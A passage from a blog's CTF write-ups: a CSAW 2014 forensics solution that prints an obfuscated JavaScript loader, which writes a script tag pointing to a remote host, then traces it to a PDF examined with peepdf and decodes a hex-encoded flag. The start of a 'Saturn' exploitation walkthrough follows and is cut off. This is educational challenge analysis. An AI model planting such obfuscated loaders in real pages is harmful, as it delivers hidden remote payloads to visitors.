<span class="line-number">103</span>
<span class="line-number">104</span>
<span class="line-number">105</span>
<span class="line-number">106</span>
<span class="line-number">107</span>
<span class="line-number">108</span>
<span class="line-number">109</span>
<span class="line-number">110</span>
<span class="line-number">111</span>
<span class="line-number">112</span>
<span class="line-number">113</span>
<span class="line-number">114</span>
<span class="line-number">115</span>
<span class="line-number">116</span>
<span class="line-number">117</span>
<span class="line-number">118</span>
<span class="line-number">119</span>
</pre></td><td class="code"><pre><code class="javascript"><span class="line"><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">l</span><span class="p">,</span> <span class="nx">f</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">	<span class="kd">function</span> <span class="nx">m</span><span class="p">()</span> <span class="p">{</span>
</span><span class="line">		<span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">elements</span><span class="p">;</span>
</span><span class="line">		<span class="k">return</span> <span class="s2">&quot;string&quot;</span> <span class="o">==</span> <span class="k">typeof</span> <span class="nx">a</span> <span class="o">?</span> <span class="nx">a</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">)</span> <span class="o">:</span> <span class="nx">a</span>
</span><span class="line">	<span class="p">}</span>
</span><span class="line">
</span><span class="line">	<span class="kd">function</span> <span class="nx">i</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">		<span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">n</span><span class="p">[</span><span class="nx">a</span><span class="p">[</span><span class="nx">o</span><span class="p">]];</span>
</span><span class="line">		<span class="nx">b</span> <span class="o">||</span> <span class="p">(</span><span class="nx">b</span> <span class="o">=</span> <span class="p">{},</span> <span class="nx">h</span><span class="o">++</span><span class="p">,</span> <span class="nx">a</span><span class="p">[</span><span class="nx">o</span><span class="p">]</span> <span class="o">=</span> <span class="nx">h</span><span class="p">,</span> <span class="nx">n</span><span class="p">[</span><span class="nx">h</span><span class="p">]</span> <span class="o">=</span> <span class="nx">b</span><span class="p">);</span>
</span><span class="line">		<span class="k">return</span> <span class="nx">b</span>
</span><span class="line">	<span class="p">}</span>
</span><span class="line">
</span><span class="line">	<span class="kd">function</span> <span class="nx">p</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">,</span> <span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">		<span class="nx">b</span> <span class="o">||</span> <span class="p">(</span><span class="nx">b</span> <span class="o">=</span> <span class="nx">f</span><span class="p">);</span>
</span><span class="line">		<span class="k">if</span> <span class="p">(</span><span class="nx">g</span><span class="p">)</span> <span class="k">return</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class="line">		<span class="nx">c</span> <span class="o">||</span> <span class="p">(</span><span class="nx">c</span> <span class="o">=</span> <span class="nx">i</span><span class="p">(</span><span class="nx">b</span><span class="p">));</span>
</span><span class="line">		<span class="nx">b</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">cache</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">?</span> <span class="nx">c</span><span class="p">.</span><span class="nx">cache</span><span class="p">[</span><span class="nx">a</span><span class="p">].</span><span class="nx">cloneNode</span><span class="p">()</span> <span class="o">:</span> <span class="nx">r</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="o">?</span> <span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">cache</span><span class="p">[</span><span class="nx">a</span><span class="p">]</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createElem</span><span class="p">(</span><span class="nx">a</span><span class="p">)).</span><span class="nx">cloneNode</span><span class="p">()</span> <span class="o">:</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createElem</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class="line">		<span class="k">return</span> <span class="nx">b</span><span class="p">.</span><span class="nx">canHaveChildren</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">s</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="o">?</span> <span class="nx">c</span><span class="p">.</span><span class="nx">frag</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">b</span><span class="p">)</span> <span class="o">:</span> <span class="nx">b</span>
</span><span class="line">	<span class="p">}</span>
</span><span class="line">
</span><span class="line">	<span class="kd">function</span> <span class="nx">t</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">b</span><span class="p">.</span><span class="nx">cache</span><span class="p">)</span> <span class="nx">b</span><span class="p">.</span><span class="nx">cache</span> <span class="o">=</span> <span class="p">{},</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createElem</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">createElement</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createFrag</span> <span class="o">=</span> <span class="nx">a</span><span class="p">.</span><span class="nx">createDocumentFragment</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">frag</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createFrag</span><span class="p">();</span>
</span><span class="line">		<span class="nx">a</span><span class="p">.</span><span class="nx">createElement</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">			<span class="k">return</span> <span class="o">!</span><span class="nx">e</span><span class="p">.</span><span class="nx">shivMethods</span> <span class="o">?</span> <span class="nx">b</span><span class="p">.</span><span class="nx">createElem</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="o">:</span> <span class="nx">p</span><span class="p">(</span><span class="nx">c</span><span class="p">,</span> <span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span>
</span><span class="line">		<span class="p">};</span>
</span><span class="line">		<span class="nx">a</span><span class="p">.</span><span class="nx">createDocumentFragment</span> <span class="o">=</span> <span class="nb">Function</span><span class="p">(</span><span class="s2">&quot;h,f&quot;</span><span class="p">,</span> <span class="s2">&quot;return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&amp;&amp;(&quot;</span> <span class="o">+</span> <span class="nx">m</span><span class="p">().</span><span class="nx">join</span><span class="p">().</span><span class="nx">replace</span><span class="p">(</span><span class="sr">/[\w\-]+/g</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">			<span class="nx">b</span><span class="p">.</span><span class="nx">createElem</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class="line">			<span class="nx">b</span><span class="p">.</span><span class="nx">frag</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class="line">			<span class="k">return</span> <span class="s1">&#39;c(&quot;&#39;</span> <span class="o">+</span> <span class="nx">a</span> <span class="o">+</span> <span class="s1">&#39;&quot;)&#39;</span>
</span><span class="line">		<span class="p">})</span> <span class="o">+</span> <span class="s2">&quot;);return n}&quot;</span><span class="p">)(</span><span class="nx">e</span><span class="p">,</span> <span class="nx">b</span><span class="p">.</span><span class="nx">frag</span><span class="p">)</span>
</span><span class="line">	<span class="p">}</span>
</span><span class="line">
</span><span class="line">	<span class="kd">function</span> <span class="nx">q</span><span class="p">(</span><span class="nx">a</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">		<span class="nx">a</span> <span class="o">||</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">f</span><span class="p">);</span>
</span><span class="line">		<span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">i</span><span class="p">(</span><span class="nx">a</span><span class="p">);</span>
</span><span class="line">		<span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">shivCSS</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">j</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">b</span><span class="p">.</span><span class="nx">hasCSS</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">			<span class="kd">var</span> <span class="nx">c</span><span class="p">,</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">a</span><span class="p">;</span>
</span><span class="line">			<span class="nx">c</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;p&quot;</span><span class="p">);</span>
</span><span class="line">			<span class="nx">d</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">getElementsByTagName</span><span class="p">(</span><span class="s2">&quot;head&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">||</span> <span class="nx">d</span><span class="p">.</span><span class="nx">documentElement</span><span class="p">;</span>
</span><span class="line">			<span class="nx">c</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&quot;x&lt;style&gt;article,aside,dialog,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}mark{background:#FF0;color:#000}template{display:none}&lt;/style&gt;&quot;</span><span class="p">;</span>
</span><span class="line">			<span class="nx">c</span> <span class="o">=</span> <span class="nx">d</span><span class="p">.</span><span class="nx">insertBefore</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">lastChild</span><span class="p">,</span> <span class="nx">d</span><span class="p">.</span><span class="nx">firstChild</span><span class="p">);</span>
</span><span class="line">			<span class="nx">b</span><span class="p">.</span><span class="nx">hasCSS</span> <span class="o">=</span> <span class="o">!!</span><span class="nx">c</span>
</span><span class="line">		<span class="p">}</span>
</span><span class="line">		<span class="nx">g</span> <span class="o">||</span> <span class="nx">t</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">);</span>
</span><span class="line">		<span class="k">return</span> <span class="nx">a</span>
</span><span class="line">	<span class="p">}</span>
</span><span class="line">	<span class="kd">var</span> <span class="nx">k</span> <span class="o">=</span> <span class="nx">l</span><span class="p">.</span><span class="nx">html5</span> <span class="o">||</span> <span class="p">{},</span>
</span><span class="line">		<span class="nx">s</span> <span class="o">=</span> <span class="sr">/^&lt;|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i</span><span class="p">,</span>
</span><span class="line">		<span class="nx">r</span> <span class="o">=</span> <span class="sr">/^(?:a|b|code|div|fieldset|h1|h2|h3|h4|h5|h6|i|label|li|ol|p|q|span|strong|style|table|tbody|td|th|tr|ul)$/i</span><span class="p">,</span>
</span><span class="line">		<span class="nx">j</span><span class="p">,</span> <span class="nx">o</span> <span class="o">=</span> <span class="s2">&quot;_html5shiv&quot;</span><span class="p">,</span>
</span><span class="line">		<span class="nx">h</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
</span><span class="line">		<span class="nx">n</span> <span class="o">=</span> <span class="p">{},</span>
</span><span class="line">		<span class="nx">g</span><span class="p">;</span>
</span><span class="line">	<span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class="line">		<span class="k">try</span> <span class="p">{</span>
</span><span class="line">			<span class="kd">var</span> <span class="nx">a</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">);</span>
</span><span class="line">			<span class="nx">a</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&quot;&lt;xyz&gt;&lt;/xyz&gt;&quot;</span><span class="p">;</span>
</span><span class="line">			<span class="nx">j</span> <span class="o">=</span> <span class="s2">&quot;hidden&quot;</span> <span class="k">in</span> <span class="nx">a</span><span class="p">;</span>
</span><span class="line">			<span class="kd">var</span> <span class="nx">b</span><span class="p">;</span>
</span><span class="line">			<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nx">b</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">==</span> <span class="nx">a</span><span class="p">.</span><span class="nx">childNodes</span><span class="p">.</span><span class="nx">length</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">				<span class="nx">f</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">);</span>
</span><span class="line">				<span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">createDocumentFragment</span><span class="p">();</span>
</span><span class="line">				<span class="nx">b</span> <span class="o">=</span> <span class="s2">&quot;undefined&quot;</span> <span class="o">==</span> <span class="k">typeof</span> <span class="nx">c</span><span class="p">.</span><span class="nx">cloneNode</span> <span class="o">||</span>
</span><span class="line">					<span class="s2">&quot;undefined&quot;</span> <span class="o">==</span> <span class="k">typeof</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createDocumentFragment</span> <span class="o">||</span> <span class="s2">&quot;undefined&quot;</span> <span class="o">==</span> <span class="k">typeof</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createElement</span>
</span><span class="line">			<span class="p">}</span>
</span><span class="line">			<span class="nx">g</span> <span class="o">=</span> <span class="nx">b</span>
</span><span class="line">		<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">d</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">			<span class="nx">g</span> <span class="o">=</span> <span class="nx">j</span> <span class="o">=</span> <span class="o">!</span><span class="mi">0</span>
</span><span class="line">		<span class="p">}</span>
</span><span class="line">	<span class="p">})();</span>
</span><span class="line">	<span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="p">{</span>
</span><span class="line">		<span class="nx">elements</span><span class="o">:</span> <span class="nx">k</span><span class="p">.</span><span class="nx">elements</span> <span class="o">||</span> <span class="s2">&quot;abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video&quot;</span><span class="p">,</span>
</span><span class="line">		<span class="nx">version</span><span class="o">:</span> <span class="s2">&quot;3.7.0&quot;</span><span class="p">,</span>
</span><span class="line">		<span class="nx">shivCSS</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span> <span class="o">!==</span> <span class="nx">k</span><span class="p">.</span><span class="nx">shivCSS</span><span class="p">,</span>
</span><span class="line">		<span class="nx">supportsUnknownElements</span><span class="o">:</span> <span class="nx">g</span><span class="p">,</span>
</span><span class="line">		<span class="nx">shivMethods</span><span class="o">:</span> <span class="o">!</span><span class="mi">1</span> <span class="o">!==</span> <span class="nx">k</span><span class="p">.</span><span class="nx">shivMethods</span><span class="p">,</span>
</span><span class="line">		<span class="nx">type</span><span class="o">:</span> <span class="s2">&quot;default&quot;</span><span class="p">,</span>
</span><span class="line">		<span class="nx">shivDocument</span><span class="o">:</span> <span class="nx">q</span><span class="p">,</span>
</span><span class="line">		<span class="nx">createElement</span><span class="o">:</span> <span class="nx">p</span><span class="p">,</span>
</span><span class="line">		<span class="nx">createDocumentFragment</span><span class="o">:</span> <span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">			<span class="nx">a</span> <span class="o">||</span> <span class="p">(</span><span class="nx">a</span> <span class="o">=</span> <span class="nx">f</span><span class="p">);</span>
</span><span class="line">			<span class="k">if</span> <span class="p">(</span><span class="nx">g</span><span class="p">)</span> <span class="k">return</span> <span class="nx">a</span><span class="p">.</span><span class="nx">createDocumentFragment</span><span class="p">();</span>
</span><span class="line">			<span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">b</span> <span class="o">=</span> <span class="nx">b</span> <span class="o">||</span> <span class="nx">i</span><span class="p">(</span><span class="nx">a</span><span class="p">),</span> <span class="nx">c</span> <span class="o">=</span> <span class="nx">b</span><span class="p">.</span><span class="nx">frag</span><span class="p">.</span><span class="nx">cloneNode</span><span class="p">(),</span> <span class="nx">d</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">e</span> <span class="o">=</span> <span class="nx">m</span><span class="p">(),</span> <span class="nx">h</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">d</span> <span class="o">&lt;</span> <span class="nx">h</span><span class="p">;</span> <span class="nx">d</span><span class="o">++</span><span class="p">)</span> <span class="nx">c</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="nx">e</span><span class="p">[</span><span class="nx">d</span><span class="p">]);</span>
</span><span class="line">			<span class="k">return</span> <span class="nx">c</span>
</span><span class="line">		<span class="p">}</span>
</span><span class="line">	<span class="p">};</span>
</span><span class="line">	<span class="nx">l</span><span class="p">.</span><span class="nx">html5</span> <span class="o">=</span> <span class="nx">e</span><span class="p">;</span>
</span><span class="line">	<span class="nx">q</span><span class="p">(</span><span class="nx">f</span><span class="p">)</span>
</span><span class="line"><span class="p">})(</span><span class="k">this</span><span class="p">,</span> <span class="nb">document</span><span class="p">);</span>
</span><span class="line"><span class="kd">var</span> <span class="nx">g</span> <span class="o">=</span> <span class="s2">&quot;ti&quot;</span><span class="p">;</span>
</span><span class="line"><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="s2">&quot;HTML Tags&quot;</span><span class="p">;</span>
</span><span class="line"><span class="kd">var</span> <span class="nx">f</span> <span class="o">=</span> <span class="s2">&quot;. li colgroup br src datalist script option .&quot;</span><span class="p">;</span>
</span><span class="line"><span class="nx">f</span> <span class="o">=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">);</span>
</span><span class="line"><span class="nx">c</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class="line"><span class="nx">k</span> <span class="o">=</span> <span class="s2">&quot;/&quot;</span><span class="p">;</span>
</span><span class="line"><span class="nx">m</span> <span class="o">=</span> <span class="nx">f</span><span class="p">[</span><span class="mi">6</span><span class="p">];</span>
</span><span class="line"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">f</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">	<span class="nx">c</span> <span class="o">+=</span> <span class="nx">f</span><span class="p">[</span><span class="nx">i</span><span class="p">].</span><span class="nx">length</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="nx">v</span> <span class="o">=</span> <span class="nx">f</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
</span><span class="line"><span class="nx">x</span> <span class="o">=</span> <span class="s2">&quot;\&#39;ht&quot;</span><span class="p">;</span>
</span><span class="line"><span class="nx">b</span> <span class="o">=</span> <span class="nx">f</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
</span><span class="line"><span class="nx">f</span> <span class="o">=</span> <span class="mi">2541</span> <span class="o">*</span> <span class="mi">6</span> <span class="o">-</span> <span class="mi">35</span> <span class="o">+</span> <span class="mi">46</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">-</span> <span class="mi">15269</span><span class="p">;</span>
</span><span class="line"><span class="nx">c</span> <span class="o">+=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span><span class="line"><span class="nx">f</span> <span class="o">=</span> <span class="p">(</span><span class="mi">56</span> <span class="o">+</span> <span class="mi">31</span> <span class="o">+</span> <span class="mi">68</span> <span class="o">*</span> <span class="mi">65</span> <span class="o">+</span> <span class="mi">41</span> <span class="o">-</span> <span class="mi">548</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4000</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
</span><span class="line"><span class="nx">c</span> <span class="o">+=</span> <span class="nx">f</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
</span><span class="line"><span class="nx">f</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
</span><span class="line"><span class="nx">c</span> <span class="o">=</span> <span class="nx">c</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">);</span>
</span><span class="line"><span class="kd">var</span> <span class="nx">w</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class="line"><span class="nx">u</span> <span class="o">=</span> <span class="s2">&quot;s&quot;</span><span class="p">;</span>
</span><span class="line"><span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">c</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span><span class="line">	<span class="k">if</span> <span class="p">(((</span><span class="nx">i</span> <span class="o">==</span> <span class="mi">3</span> <span class="o">||</span> <span class="nx">i</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">w</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="o">||</span> <span class="p">((</span><span class="nx">i</span> <span class="o">==</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">w</span> <span class="o">==</span> <span class="mi">2</span><span class="p">))</span> <span class="p">{</span>
</span><span class="line">		<span class="nx">f</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">46</span><span class="p">);</span>
</span><span class="line">		<span class="nx">w</span><span class="o">++</span><span class="p">;</span>
</span><span class="line">	<span class="p">}</span>
</span><span class="line">	<span class="nx">f</span> <span class="o">+=</span> <span class="nx">c</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
</span><span class="line"><span class="p">}</span>
</span><span class="line"><span class="nx">i</span> <span class="o">=</span> <span class="nx">k</span> <span class="o">+</span> <span class="s2">&quot;anal&quot;</span><span class="p">;</span>
</span><span class="line"><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s2">&quot;&lt;&quot;</span> <span class="o">+</span> <span class="nx">m</span> <span class="o">+</span> <span class="s2">&quot; &quot;</span> <span class="o">+</span> <span class="nx">b</span> <span class="o">+</span> <span class="s2">&quot;=&quot;</span> <span class="o">+</span> <span class="nx">x</span> <span class="o">+</span> <span class="s2">&quot;tp:&quot;</span> <span class="o">+</span> <span class="nx">k</span> <span class="o">+</span> <span class="nx">k</span> <span class="o">+</span> <span class="nx">f</span> <span class="o">+</span> <span class="nx">i</span> <span class="o">+</span> <span class="s2">&quot;y&quot;</span> <span class="o">+</span> <span class="nx">g</span> <span class="o">+</span> <span class="s2">&quot;c&quot;</span> <span class="o">+</span> <span class="nx">u</span> <span class="o">+</span> <span class="nx">v</span> <span class="o">+</span> <span class="s2">&quot;j&quot;</span> <span class="o">+</span> <span class="nx">u</span> <span class="o">+</span> <span class="s2">&quot;\&#39;&gt;\&lt;/&quot;</span> <span class="o">+</span> <span class="nx">m</span> <span class="o">+</span> <span class="s2">&quot;\&gt;&quot;</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>The purpose of this javascript was to redirect the user to the following URL</p>

<pre><code>http://128.238.66.100/announcement.pdf
</code></pre>

<p>upon execution.</p>

<p>The PDF, when opened into a viewer looked as follow:</p>

<p><img class="center" src="http://swappage.github.io/images/2014-09-28/pdf.png" /></p>

<p>and at a first look it looked just like an image of a wizard with text on it.</p>

<p>But it for sure was hiding something, the usage of PDF with attached malicious content is very common in waterhole attacks, so why not giving it a closer look with PDF analysis tools like peepdf?</p>

<pre><code># peepdf -i announcement.pdf 
Warning: Spidermonkey is not installed!!
Warning: pylibemu is not installed!!

File: announcement.pdf
MD5: 02794f436a5bb6100e2fe67714cf5933
SHA1: 322e70a561aeee3833145d7f0942c8e32fe24241
Size: 390303 bytes
Version: 1.4
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 9
Streams: 4
Comments: 0
Errors: 0

Version 0:
	Catalog: 6
	Info: 7
	Objects (9): [1, 2, 3, 4, 5, 6, 7, 8, 9]
	Streams (4): [1, 2, 3, 8]
		Encoded (4): [1, 2, 3, 8]
	Suspicious elements:
		/Names: [6]
		/EmbeddedFiles: [6]
		/EmbeddedFile: [8]
</code></pre>

<p>Wow, so many objects,  it was really worth looking at it one by one more closely, because in fact in the 8th one we could spot:</p>

<pre><code>PPDF&gt; object 8

&lt;&lt; /Length 212
/Type /EmbeddedFile
/Filter /FlateDecode
/Params &lt;&lt; /Size 495
/Subtype /application/pdf &gt;&gt;
stream
var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
endstream
</code></pre>

<p>The hex encoded text looked promising…</p>

<pre><code># python
Python 2.7.3 (default, Mar 14 2014, 11:57:14) 
[GCC 4.7.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; print "\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"
YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}
&gt;&gt;&gt;
</code></pre>

<p>So, finally, here was the flag!</p>

<pre><code>key{Those Fluffy Bunnies Make Tummy Bumpy}
</code></pre>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW 2014: Saturn Walkthrough]]></title>
    <link href="http://swappage.github.io/blog/2014/09/24/csaw-2014-saturn-walkthrough/"/>
    <updated>2014-09-24T21:20:47+02:00</updated>
    <id>http://swappage.github.io/blog/2014/09/24/csaw-2014-saturn-walkthrough</id>
    <content type="html"><![CDATA[<h2 id="starring">Starring</h2>
<ul>
  <li>Superkojiman as <em>My brain runs assembly code</em></li>
  <li>Barrebas as <em>The silent disassembler ninja</em></li>
  <li>Swappage as <em>The mumbler and random guesser</em></li>
</ul>

<p>Hello hello, Swappage here writing on behalf of the whole group that worked on this exploit dev :) please don’t kill me as my English is really terrible, although it might also be Koji and Bas’ fault for not reviewing this doc properly before publishing :p</p>

<p>During the past weekend me and a bunch of dudes from <a href="www.vulnhub.com">VulnHub</a> decided to test ourselves and play the CSAW 2014 CTF challenge. Along wight he 300 point Forensics challenge, Saturn at exploitation 400 was one of the more interesting ones to solve. This is our writeup on it. 
<!-- more --></p>

<p>the question from the challenge stated:</p>

<p><em>You have stolen the checking program for the CSAW Challenge-Response-Authentication-Protocol system. Unfortunately you forgot to grab the challenge-response keygen algorithm (libchallengeresponse.so). Can you still manage to bypass the secure system and read the flag?</em></p>

<p>So basically our objective was to find a way to bypass the challenge-response handshake authentication process handled by this binary to read the flag; it was also obvious that we were missing a component, which was supposed to handle the task of generating the challenge response, and that we needed to live with it.</p>

<h2 id="getting-the-binary-to-run">Getting the binary to run</h2>
<p>A quick check against the binary using ldd confirmed that we actually were missing a module which was needed for the application to run; relying simply on static analysis might be <strong>extremely</strong> frustrating and unproductive, so our first step was to make sure we could execute the binary locally to also perform dynamic analysis.
We came up with the following code snippet that we compiled as shared library:</p>

<p>Here is the .c snipplet</p>

<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
<span class="line-number">2</span>
<span class="line-number">3</span>
<span class="line-number">4</span>
<span class="line-number">5</span>
<span class="line-number">6</span>
</pre></td><td class="code"><pre><code class="c"><span class="line"><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class="line"><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class="line">
</span><span class="line"><span class="kt">int</span> <span class="nf">fillChallengeResponse</span><span class="p">()</span> <span class="p">{</span>
</span><span class="line">	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class="line"><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></notextile></div>

<p>and the .h</p>

